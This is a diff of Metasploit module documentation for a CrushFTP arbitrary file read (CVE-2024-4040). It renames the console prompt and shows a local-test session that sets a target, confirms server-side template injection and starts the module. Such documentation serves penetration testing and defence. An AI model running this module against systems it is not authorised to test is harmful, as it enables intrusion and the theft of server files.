@@ -39,7 +39,7 @@ To set up a test environment:
 ## Scenarios
 ### CrushFTP on Windows, Linux, or Mac
 ```
-msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > show options 
+msf auxiliary(gather/crushftp_fileread_cve_2024_4040) > show options 
 
 Module options (auxiliary/gather/crushftp_fileread_cve_2024_4040):
 
@@ -60,11 +60,11 @@ Module options (auxiliary/gather/crushftp_fileread_cve_2024_4040):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > set RHOSTS 127.0.0.1
+msf auxiliary(gather/crushftp_fileread_cve_2024_4040) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
-msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > check
+msf auxiliary(gather/crushftp_fileread_cve_2024_4040) > check
 [+] 127.0.0.1:8080 - The target is vulnerable. Server-side template injection successful!
-msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > run
+msf auxiliary(gather/crushftp_fileread_cve_2024_4040) > run
 [*] Running module against 127.0.0.1
 
 [*] Running automatic check ("set AutoCheck false" to disable)
